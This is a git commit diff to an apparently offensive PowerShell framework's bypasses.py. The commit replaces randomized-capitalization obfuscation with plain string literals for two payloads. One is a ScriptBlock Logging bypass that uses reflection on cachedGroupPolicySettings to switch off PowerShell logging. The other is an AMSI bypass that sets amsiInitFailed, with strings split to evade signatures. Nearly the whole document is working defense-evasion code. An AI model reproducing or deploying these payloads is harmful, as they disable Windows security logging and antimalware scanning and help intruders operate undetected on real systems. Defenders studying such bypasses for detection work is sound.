1f7e773d05edda85909e4f62f84d7788aa434184
phra <greensoncio@gmail.com>
2019-01-02 03:59:06 +0100

    refactor: remove calls to randomize_capitalization

--- lib/common/bypasses.py
+++ lib/common/bypasses.py
@@ -3,34 +3,28 @@ import helpers
 
 def scriptBlockLogBypass():
     # ScriptBlock Logging bypass
-    bypass = helpers.randomize_capitalization("$"+helpers.generate_random_script_var_name("GPF")+"=[ref].Assembly.GetType(")
-    bypass += "'System.Management.Automation.Utils'"
-    bypass += helpers.randomize_capitalization(").\"GetFie`ld\"(")
-    bypass += "'cachedGroupPolicySettings','N'+'onPublic,Static'"
-    bypass += helpers.randomize_capitalization(");If($"+helpers.generate_random_script_var_name("GPF")+"){$"+helpers.generate_random_script_var_name("GPC")+"=$"+helpers.generate_random_script_var_name("GPF")+".GetValue($null);If($"+helpers.generate_random_script_var_name("GPC")+"")
-    bypass += "['ScriptB'+'lockLogging']"
-    bypass += helpers.randomize_capitalization("){$"+helpers.generate_random_script_var_name("GPC")+"")
-    bypass += "['ScriptB'+'lockLogging']['EnableScriptB'+'lockLogging']=0;"
-    bypass += helpers.randomize_capitalization("$"+helpers.generate_random_script_var_name("GPC")+"")
-    bypass += "['ScriptB'+'lockLogging']['EnableScriptBlockInvocationLogging']=0}"
-    bypass += helpers.randomize_capitalization("$val=[Collections.Generic.Dictionary[string,System.Object]]::new();$val.Add")
-    bypass += "('EnableScriptB'+'lockLogging',0);"
-    bypass += helpers.randomize_capitalization("$val.Add")
-    bypass += "('EnableScriptBlockInvocationLogging',0);"
-    bypass += helpers.randomize_capitalization("$"+helpers.generate_random_script_var_name("GPC")+"")
-    bypass += "['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptB'+'lockLogging']"
-    bypass += helpers.randomize_capitalization("=$val}")
-    bypass += helpers.randomize_capitalization("Else{[ScriptBlock].\"GetFie`ld\"(")
-    bypass += "'signatures','N'+'onPublic,Static'"
-    bypass += helpers.randomize_capitalization(").SetValue($null,(New-Object Collections.Generic.HashSet[string]))}")
-    return bypass
+    bypass = """
+    $GPF=[ref].Assembly.GetType('System.Management.Automation.Utils').\"GetFie`ld\"('cachedGroupPolicySettings','N'+'onPublic,Static');
+    If($GPF){
+        $GPC=$GPF.GetValue($null);
+        If($GPC['ScriptB'+'lockLogging']){
+            $GPC['ScriptB'+'lockLogging']['EnableScriptB'+'lockLogging']=0;
+            $GPC['ScriptB'+'lockLogging']['EnableScriptBlockInvocationLogging']=0
+        }
+        $val=[Collections.Generic.Dictionary[string,System.Object]]::new();
+        $val.Add('EnableScriptB'+'lockLogging',0);
+        $val.Add('EnableScriptBlockInvocationLogging',0);
+        $GPC['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptB'+'lockLogging']=$val
+    } Else {
+        [ScriptBlock].\"GetFie`ld\"('signatures','N'+'onPublic,Static').SetValue($null,(New-Object Collections.Generic.HashSet[string]))
+    }
+    """
+    return bypass.replace('\n','').replace('    ', '')
 
 
 def AMSIBypass():
     # @mattifestation's AMSI bypass
-    bypass = helpers.randomize_capitalization("$Ref=[Ref].Assembly.GetType(")
-    bypass += "'System.Management.Automation.AmsiUtils'"
-    bypass += helpers.randomize_capitalization(');$Ref.GetField(')
-    bypass += "'amsiInitFailed','NonPublic,Static'"
-    bypass += helpers.randomize_capitalization(").SetValue($null,$true);")
-    return bypass
+    bypass = """
+    $Ref=[Ref].Assembly.GetType('System.Management.Automation.Ams'+'iUtils');$Ref.GetField('amsiIn'+'itFailed','NonPublic,Static').SetValue($null,$true);
+    """
+    return bypass.replace('\n','').replace('    ', '')
